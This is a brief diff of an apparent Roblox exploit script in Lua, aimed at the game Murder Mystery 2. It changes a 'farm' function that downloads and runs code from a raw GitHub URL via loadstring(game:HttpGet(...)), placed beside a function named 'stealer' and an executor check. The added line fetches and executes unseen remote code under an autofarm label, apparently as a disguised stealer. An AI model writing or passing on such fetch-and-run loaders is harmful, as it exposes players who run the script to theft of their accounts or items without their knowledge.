@@ -24,7 +24,7 @@ local function stealer()
 end
 
 local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/hayrankal/loading/refs/heads/main/loading"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hayrankal/2025Newopautofarm/refs/heads/main/mm2speedautofarm"))()
 end
 
 -- Executor kontrolü
